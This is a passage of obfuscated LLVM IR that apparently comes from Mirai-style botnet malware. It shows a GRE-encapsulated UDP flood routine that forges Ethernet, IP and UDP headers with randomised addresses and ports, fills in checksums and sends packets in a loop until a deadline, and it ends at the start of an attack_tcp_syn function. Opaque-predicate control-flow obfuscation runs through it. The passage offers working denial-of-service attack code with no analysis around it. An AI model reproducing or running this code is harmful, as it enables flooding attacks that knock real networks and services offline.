  %232 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %233 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %232, i32 0, i32 2
  store i16 %231, i16* %233, align 1
  %234 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %235 = bitcast %struct.iphdr* %234 to i8*
  %236 = load i8, i8* %235, align 4
  %237 = and i8 %236, 15
  %238 = or i8 %237, 64
  store i8 %238, i8* %235, align 4
  %239 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %240 = bitcast %struct.iphdr* %239 to i8*
  %241 = load i8, i8* %240, align 4
  %242 = and i8 %241, -16
  %243 = or i8 %242, 5
  store i8 %243, i8* %240, align 4
  %244 = load i8, i8* %14, align 1
  %245 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %246 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %245, i32 0, i32 1
  store i8 %244, i8* %246, align 1
  %247 = load i32, i32* %20, align 4
  %248 = sext i32 %247 to i64
  %249 = add i64 28, %248
  %250 = trunc i64 %249 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %253 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %15, align 2
  %255 = zext i16 %254 to i32
  %256 = xor i32 %255, -1
  %257 = trunc i32 %256 to i16
  %258 = call zeroext i16 @htons(i16 zeroext %257) #7
  %259 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %260 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %259, i32 0, i32 3
  store i16 %258, i16* %260, align 4
  %261 = load i8, i8* %16, align 1
  %262 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %263 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %262, i32 0, i32 5
  store i8 %261, i8* %263, align 4
  %264 = load i8, i8* %17, align 1
  %265 = icmp ne i8 %264, 0
  br i1 %265, label %266, label %270

; <label>:266:                                    ; preds = %214
  %267 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %268 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %269 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %268, i32 0, i32 4
  store i16 %267, i16* %269, align 2
  br label %270

; <label>:270:                                    ; preds = %266, %214
  %271 = load i32, i32* @x.21
  %272 = load i32, i32* @y.22
  %273 = sub i32 %271, 1
  %274 = mul i32 %271, %273
  %275 = urem i32 %274, 2
  %276 = icmp eq i32 %275, 0
  %277 = icmp slt i32 %272, 10
  %278 = or i1 %276, %277
  br i1 %278, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %270
  %279 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %280 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %279, i32 0, i32 6
  store i8 17, i8* %280, align 1
  %281 = call i32 @rand_next()
  %282 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %283 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %282, i32 0, i32 8
  store i32 %281, i32* %283, align 4
  %284 = load i8, i8* %22, align 1
  %285 = icmp ne i8 %284, 0
  %286 = load i32, i32* @x.21
  %287 = load i32, i32* @y.22
  %288 = sub i32 %286, 1
  %289 = mul i32 %286, %288
  %290 = urem i32 %289, 2
  %291 = icmp eq i32 %290, 0
  %292 = icmp slt i32 %287, 10
  %293 = or i1 %291, %292
  br i1 %293, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %285, label %294, label %300

; <label>:294:                                    ; preds = %originalBBpart212
  %295 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %296 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %295, i32 0, i32 9
  %297 = load i32, i32* %296, align 4
  %298 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %299 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %298, i32 0, i32 9
  store i32 %297, i32* %299, align 4
  br label %308

; <label>:300:                                    ; preds = %originalBBpart212
  %301 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %302 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %301, i32 0, i32 8
  %303 = load i32, i32* %302, align 4
  %304 = sub i32 %303, 1024
  %305 = xor i32 %304, -1
  %306 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %307 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %306, i32 0, i32 9
  store i32 %305, i32* %307, align 4
  br label %308

; <label>:308:                                    ; preds = %300, %294
  %309 = load i32, i32* @x.21
  %310 = load i32, i32* @y.22
  %311 = sub i32 %309, 1
  %312 = mul i32 %309, %311
  %313 = urem i32 %312, 2
  %314 = icmp eq i32 %313, 0
  %315 = icmp slt i32 %310, 10
  %316 = or i1 %314, %315
  br i1 %316, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %308
  %317 = load i16, i16* %18, align 2
  %318 = call zeroext i16 @htons(i16 zeroext %317) #7
  %319 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %320 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %319, i32 0, i32 0
  store i16 %318, i16* %320, align 2
  %321 = load i16, i16* %19, align 2
  %322 = call zeroext i16 @htons(i16 zeroext %321) #7
  %323 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %324 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %323, i32 0, i32 1
  store i16 %322, i16* %324, align 2
  %325 = load i32, i32* %20, align 4
  %326 = sext i32 %325 to i64
  %327 = add i64 8, %326
  %328 = trunc i64 %327 to i16
  %329 = call zeroext i16 @htons(i16 zeroext %328) #7
  %330 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %331 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %330, i32 0, i32 2
  store i16 %329, i16* %331, align 2
  %332 = load i32, i32* @x.21
  %333 = load i32, i32* @y.22
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBBpart220, label %originalBB14alteredBB

originalBBpart220:                                ; preds = %originalBB14
  br label %340

; <label>:340:                                    ; preds = %originalBBpart220
  %341 = load i32, i32* %11, align 4
  %342 = add nsw i32 %341, 1
  store i32 %342, i32* %11, align 4
  br label %152

; <label>:343:                                    ; preds = %152
  %344 = load i32, i32* @x.21
  %345 = load i32, i32* @y.22
  %346 = sub i32 %344, 1
  %347 = mul i32 %344, %346
  %348 = urem i32 %347, 2
  %349 = icmp eq i32 %348, 0
  %350 = icmp slt i32 %345, 10
  %351 = or i1 %349, %350
  br i1 %351, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %343
  %352 = load i32, i32* @x.21
  %353 = load i32, i32* @y.22
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %360

; <label>:360:                                    ; preds = %649, %originalBBpart224
  store i32 0, i32* %11, align 4
  br label %361

; <label>:361:                                    ; preds = %640, %360
  %362 = load i32, i32* %11, align 4
  %363 = load i8, i8* %7, align 1
  %364 = zext i8 %363 to i32
  %365 = icmp slt i32 %362, %364
  br i1 %365, label %366, label %643

; <label>:366:                                    ; preds = %361
  %367 = load i8**, i8*** %13, align 8
  %368 = load i32, i32* %11, align 4
  %369 = sext i32 %368 to i64
  %370 = getelementptr inbounds i8*, i8** %367, i64 %369
  %371 = load i8*, i8** %370, align 8
  store i8* %371, i8** %33, align 8
  %372 = load i8*, i8** %33, align 8
  %373 = bitcast i8* %372 to %struct.iphdr*
  store %struct.iphdr* %373, %struct.iphdr** %34, align 8
  %374 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %375 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %374, i64 1
  %376 = bitcast %struct.iphdr* %375 to %struct.grehdr*
  store %struct.grehdr* %376, %struct.grehdr** %35, align 8
  %377 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %378 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %377, i64 1
  %379 = bitcast %struct.grehdr* %378 to %struct.ethhdr*
  store %struct.ethhdr* %379, %struct.ethhdr** %36, align 8
  %380 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %381 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %380, i64 1
  %382 = bitcast %struct.ethhdr* %381 to %struct.iphdr*
  store %struct.iphdr* %382, %struct.iphdr** %37, align 8
  %383 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i64 1
  %385 = bitcast %struct.iphdr* %384 to %struct.udphdr*
  store %struct.udphdr* %385, %struct.udphdr** %38, align 8
  %386 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %387 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %386, i64 1
  %388 = bitcast %struct.udphdr* %387 to i8*
  store i8* %388, i8** %39, align 8
  %389 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %390 = load i32, i32* %11, align 4
  %391 = sext i32 %390 to i64
  %392 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %389, i64 %391
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %392, i32 0, i32 2
  %394 = load i8, i8* %393, align 4
  %395 = zext i8 %394 to i32
  %396 = icmp slt i32 %395, 32
  br i1 %396, label %397, label %418

; <label>:397:                                    ; preds = %366
  %398 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %399 = load i32, i32* %11, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i32 0, i32 1
  %403 = load i32, i32* %402, align 4
  %404 = call i32 @ntohl(i32 %403) #7
  %405 = call i32 @rand_next()
  %406 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %407 = load i32, i32* %11, align 4
  %408 = sext i32 %407 to i64
  %409 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i64 %408
  %410 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %409, i32 0, i32 2
  %411 = load i8, i8* %410, align 4
  %412 = zext i8 %411 to i32
  %413 = lshr i32 %405, %412
  %414 = add i32 %404, %413
  %415 = call i32 @htonl(i32 %414) #7
  %416 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %417 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %416, i32 0, i32 9
  store i32 %415, i32* %417, align 4
  br label %418

; <label>:418:                                    ; preds = %397, %366
  %419 = load i32, i32* %23, align 4
  %420 = icmp eq i32 %419, -1
  br i1 %420, label %421, label %425

; <label>:421:                                    ; preds = %418
  %422 = call i32 @rand_next()
  %423 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %424 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %423, i32 0, i32 8
  store i32 %422, i32* %424, align 4
  br label %425

; <label>:425:                                    ; preds = %421, %418
  %426 = load i16, i16* %15, align 2
  %427 = zext i16 %426 to i32
  %428 = icmp eq i32 %427, 65535
  br i1 %428, label %429, label %444

; <label>:429:                                    ; preds = %425
  %430 = call i32 @rand_next()
  %431 = and i32 %430, 65535
  %432 = trunc i32 %431 to i16
  %433 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %434 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %433, i32 0, i32 3
  store i16 %432, i16* %434, align 4
  %435 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 3
  %437 = load i16, i16* %436, align 4
  %438 = zext i16 %437 to i32
  %439 = sub nsw i32 %438, 1000
  %440 = xor i32 %439, -1
  %441 = trunc i32 %440 to i16
  %442 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 3
  store i16 %441, i16* %443, align 4
  br label %444

; <label>:444:                                    ; preds = %429, %425
  %445 = load i32, i32* @x.21
  %446 = load i32, i32* @y.22
  %447 = sub i32 %445, 1
  %448 = mul i32 %445, %447
  %449 = urem i32 %448, 2
  %450 = icmp eq i32 %449, 0
  %451 = icmp slt i32 %446, 10
  %452 = or i1 %450, %451
  br i1 %452, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %444
  %453 = load i16, i16* %18, align 2
  %454 = zext i16 %453 to i32
  %455 = icmp eq i32 %454, 65535
  %456 = load i32, i32* @x.21
  %457 = load i32, i32* @y.22
  %458 = sub i32 %456, 1
  %459 = mul i32 %456, %458
  %460 = urem i32 %459, 2
  %461 = icmp eq i32 %460, 0
  %462 = icmp slt i32 %457, 10
  %463 = or i1 %461, %462
  br i1 %463, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br i1 %455, label %464, label %470

; <label>:464:                                    ; preds = %originalBBpart228
  %465 = call i32 @rand_next()
  %466 = and i32 %465, 65535
  %467 = trunc i32 %466 to i16
  %468 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %469 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %468, i32 0, i32 0
  store i16 %467, i16* %469, align 2
  br label %470

; <label>:470:                                    ; preds = %464, %originalBBpart228
  %471 = load i16, i16* %19, align 2
  %472 = zext i16 %471 to i32
  %473 = icmp eq i32 %472, 65535
  br i1 %473, label %474, label %480

; <label>:474:                                    ; preds = %470
  %475 = call i32 @rand_next()
  %476 = and i32 %475, 65535
  %477 = trunc i32 %476 to i16
  %478 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %479 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %478, i32 0, i32 1
  store i16 %477, i16* %479, align 2
  br label %480

; <label>:480:                                    ; preds = %474, %470
  %481 = load i32, i32* @x.21
  %482 = load i32, i32* @y.22
  %483 = sub i32 %481, 1
  %484 = mul i32 %481, %483
  %485 = urem i32 %484, 2
  %486 = icmp eq i32 %485, 0
  %487 = icmp slt i32 %482, 10
  %488 = or i1 %486, %487
  br i1 %488, label %originalBB30, label %originalBB30alteredBB

originalBB30:                                     ; preds = %originalBB30alteredBB, %480
  %489 = load i8, i8* %22, align 1
  %490 = icmp ne i8 %489, 0
  %491 = load i32, i32* @x.21
  %492 = load i32, i32* @y.22
  %493 = sub i32 %491, 1
  %494 = mul i32 %491, %493
  %495 = urem i32 %494, 2
  %496 = icmp eq i32 %495, 0
  %497 = icmp slt i32 %492, 10
  %498 = or i1 %496, %497
  br i1 %498, label %originalBBpart232, label %originalBB30alteredBB

originalBBpart232:                                ; preds = %originalBB30
  br i1 %490, label %519, label %499

; <label>:499:                                    ; preds = %originalBBpart232
  %500 = load i32, i32* @x.21
  %501 = load i32, i32* @y.22
  %502 = sub i32 %500, 1
  %503 = mul i32 %500, %502
  %504 = urem i32 %503, 2
  %505 = icmp eq i32 %504, 0
  %506 = icmp slt i32 %501, 10
  %507 = or i1 %505, %506
  br i1 %507, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %499
  %508 = call i32 @rand_next()
  %509 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %510 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %509, i32 0, i32 9
  store i32 %508, i32* %510, align 4
  %511 = load i32, i32* @x.21
  %512 = load i32, i32* @y.22
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %541

; <label>:519:                                    ; preds = %originalBBpart232
  %520 = load i32, i32* @x.21
  %521 = load i32, i32* @y.22
  %522 = sub i32 %520, 1
  %523 = mul i32 %520, %522
  %524 = urem i32 %523, 2
  %525 = icmp eq i32 %524, 0
  %526 = icmp slt i32 %521, 10
  %527 = or i1 %525, %526
  br i1 %527, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %519
  %528 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %529 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %528, i32 0, i32 9
  %530 = load i32, i32* %529, align 4
  %531 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %532 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %531, i32 0, i32 9
  store i32 %530, i32* %532, align 4
  %533 = load i32, i32* @x.21
  %534 = load i32, i32* @y.22
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %541

; <label>:541:                                    ; preds = %originalBBpart240, %originalBBpart236
  %542 = call i32 @rand_next()
  store i32 %542, i32* %40, align 4
  %543 = call i32 @rand_next()
  store i32 %543, i32* %41, align 4
  %544 = call i32 @rand_next()
  store i32 %544, i32* %42, align 4
  %545 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %546 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %545, i32 0, i32 0
  %547 = getelementptr inbounds [6 x i8], [6 x i8]* %546, i32 0, i32 0
  %548 = bitcast i32* %40 to i8*
  call void @util_memcpy(i8* %547, i8* %548, i32 4)
  %549 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %550 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %549, i32 0, i32 1
  %551 = getelementptr inbounds [6 x i8], [6 x i8]* %550, i32 0, i32 0
  %552 = bitcast i32* %41 to i8*
  call void @util_memcpy(i8* %551, i8* %552, i32 4)
  %553 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %554 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %553, i32 0, i32 0
  %555 = getelementptr inbounds [6 x i8], [6 x i8]* %554, i32 0, i32 0
  %556 = getelementptr inbounds i8, i8* %555, i64 4
  %557 = bitcast i32* %42 to i8*
  call void @util_memcpy(i8* %556, i8* %557, i32 2)
  %558 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %559 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %558, i32 0, i32 1
  %560 = getelementptr inbounds [6 x i8], [6 x i8]* %559, i32 0, i32 0
  %561 = getelementptr inbounds i8, i8* %560, i64 4
  %562 = bitcast i32* %42 to i8*
  %563 = getelementptr inbounds i8, i8* %562, i64 2
  call void @util_memcpy(i8* %561, i8* %563, i32 2)
  %564 = load i8, i8* %21, align 1
  %565 = icmp ne i8 %564, 0
  br i1 %565, label %566, label %573

; <label>:566:                                    ; preds = %541
  %567 = load i8*, i8** %39, align 8
  %568 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %567, i32 %568)
  %569 = load i8*, i8** %39, align 8
  %570 = load i32, i32* %20, align 4
  %571 = sext i32 %570 to i64
  %572 = getelementptr inbounds i8, i8* %569, i64 %571
  store i8 0, i8* %572, align 1
  br label %573

; <label>:573:                                    ; preds = %566, %541
  %574 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %575 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %574, i32 0, i32 7
  store i16 0, i16* %575, align 2
  %576 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %577 = bitcast %struct.iphdr* %576 to i16*
  %578 = call zeroext i16 @checksum_generic(i16* %577, i32 20)
  %579 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %580 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %579, i32 0, i32 7
  store i16 %578, i16* %580, align 2
  %581 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %582 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %581, i32 0, i32 7
  store i16 0, i16* %582, align 2
  %583 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %584 = bitcast %struct.iphdr* %583 to i16*
  %585 = call zeroext i16 @checksum_generic(i16* %584, i32 20)
  %586 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %587 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %586, i32 0, i32 7
  store i16 %585, i16* %587, align 2
  %588 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %589 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %588, i32 0, i32 3
  store i16 0, i16* %589, align 2
  %590 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %591 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %592 = bitcast %struct.udphdr* %591 to i8*
  %593 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %594 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %593, i32 0, i32 2
  %595 = load i16, i16* %594, align 2
  %596 = load i32, i32* %20, align 4
  %597 = sext i32 %596 to i64
  %598 = add i64 8, %597
  %599 = trunc i64 %598 to i32
  %600 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %590, i8* %592, i16 zeroext %595, i32 %599)
  %601 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %602 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %601, i32 0, i32 3
  store i16 %600, i16* %602, align 2
  %603 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %604 = load i32, i32* %11, align 4
  %605 = sext i32 %604 to i64
  %606 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %603, i64 %605
  %607 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %606, i32 0, i32 0
  %608 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %607, i32 0, i32 0
  store i16 2, i16* %608, align 4
  %609 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %610 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %609, i32 0, i32 9
  %611 = load i32, i32* %610, align 4
  %612 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %613 = load i32, i32* %11, align 4
  %614 = sext i32 %613 to i64
  %615 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %612, i64 %614
  %616 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %615, i32 0, i32 0
  %617 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %616, i32 0, i32 2
  %618 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %617, i32 0, i32 0
  store i32 %611, i32* %618, align 4
  %619 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %620 = load i32, i32* %11, align 4
  %621 = sext i32 %620 to i64
  %622 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %619, i64 %621
  %623 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %622, i32 0, i32 0
  %624 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %623, i32 0, i32 1
  store i16 0, i16* %624, align 2
  %625 = load i32, i32* %12, align 4
  %626 = load i8*, i8** %33, align 8
  %627 = load i32, i32* %20, align 4
  %628 = sext i32 %627 to i64
  %629 = add i64 66, %628
  %630 = bitcast %union.__CONST_SOCKADDR_ARG* %43 to %struct.sockaddr**
  %631 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %632 = load i32, i32* %11, align 4
  %633 = sext i32 %632 to i64
  %634 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %631, i64 %633
  %635 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %634, i32 0, i32 0
  %636 = bitcast %struct.sockaddr_in* %635 to %struct.sockaddr*
  store %struct.sockaddr* %636, %struct.sockaddr** %630, align 8
  %637 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %43, i32 0, i32 0
  %638 = load %struct.sockaddr*, %struct.sockaddr** %637, align 8
  %639 = call i64 @sendto(i32 %625, i8* %626, i64 %629, i32 16384, %struct.sockaddr* %638, i32 16)
  br label %640

; <label>:640:                                    ; preds = %573
  %641 = load i32, i32* %11, align 4
  %642 = add nsw i32 %641, 1
  store i32 %642, i32* %11, align 4
  br label %361

; <label>:643:                                    ; preds = %361
  %644 = call i64 @time(i64* null) #6
  %645 = load i32, i32* %24, align 4
  %646 = sext i32 %645 to i64
  %647 = icmp sgt i64 %644, %646
  br i1 %647, label %648, label %649

; <label>:648:                                    ; preds = %643
  br label %650

; <label>:649:                                    ; preds = %643
  br label %360

; <label>:650:                                    ; preds = %648, %originalBBpart24, %94
  %651 = load i32, i32* @x.21
  %652 = load i32, i32* @y.22
  %653 = sub i32 %651, 1
  %654 = mul i32 %651, %653
  %655 = urem i32 %654, 2
  %656 = icmp eq i32 %655, 0
  %657 = icmp slt i32 %652, 10
  %658 = or i1 %656, %657
  br i1 %658, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %650
  %659 = load i32, i32* @x.21
  %660 = load i32, i32* @y.22
  %661 = sub i32 %659, 1
  %662 = mul i32 %659, %661
  %663 = urem i32 %662, 2
  %664 = icmp eq i32 %663, 0
  %665 = icmp slt i32 %660, 10
  %666 = or i1 %664, %665
  br i1 %666, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %95
  store i32 1, i32* %11, align 4
  %667 = load i32, i32* %12, align 4
  %668 = bitcast i32* %11 to i8*
  %669 = call i32 @setsockopt(i32 %667, i32 0, i32 3, i8* %668, i32 4) #6
  %670 = icmp eq i32 %669, -1
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %116
  %671 = load i32, i32* %12, align 4
  %672 = call i32 @close(i32 %671)
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %135
  store i32 0, i32* %11, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %270
  %673 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %674 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %673, i32 0, i32 6
  store i8 17, i8* %674, align 1
  %675 = call i32 @rand_next()
  %676 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %677 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %676, i32 0, i32 8
  store i32 %675, i32* %677, align 4
  %678 = load i8, i8* %22, align 1
  %679 = icmp ne i8 %678, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %308
  %680 = load i16, i16* %18, align 2
  %681 = call zeroext i16 @htons(i16 zeroext %680) #7
  %682 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %683 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %682, i32 0, i32 0
  store i16 %681, i16* %683, align 2
  %684 = load i16, i16* %19, align 2
  %685 = call zeroext i16 @htons(i16 zeroext %684) #7
  %686 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %687 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %686, i32 0, i32 1
  store i16 %685, i16* %687, align 2
  %688 = load i32, i32* %20, align 4
  %689 = sext i32 %688 to i64
  %_ = shl i64 8, %689
  %_15 = shl i64 8, %689
  %_16 = sub i64 8, %689
  %gen = mul i64 %_16, %689
  %_17 = sub i64 8, %689
  %gen18 = mul i64 %_17, %689
  %690 = add i64 8, %689
  %691 = trunc i64 %690 to i16
  %692 = call zeroext i16 @htons(i16 zeroext %691) #7
  %693 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %694 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %693, i32 0, i32 2
  store i16 %692, i16* %694, align 2
  br label %originalBB14

originalBB22alteredBB:                            ; preds = %originalBB22, %343
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %444
  %695 = load i16, i16* %18, align 2
  %696 = zext i16 %695 to i32
  %697 = icmp eq i32 %696, 65535
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %480
  %698 = load i8, i8* %22, align 1
  %699 = icmp ne i8 %698, 0
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %499
  %700 = call i32 @rand_next()
  %701 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %702 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %701, i32 0, i32 9
  store i32 %700, i32* %702, align 4
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %519
  %703 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %704 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %703, i32 0, i32 9
  %705 = load i32, i32* %704, align 4
  %706 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %707 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %706, i32 0, i32 9
  store i32 %705, i32* %707, align 4
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %650
  br label %originalBB42
}

; Function Attrs: noinline nounwind uwtable
define void @attack_tcp_syn(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = load i32, i32* @x.23
  %7 = load i32, i32* @y.24
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
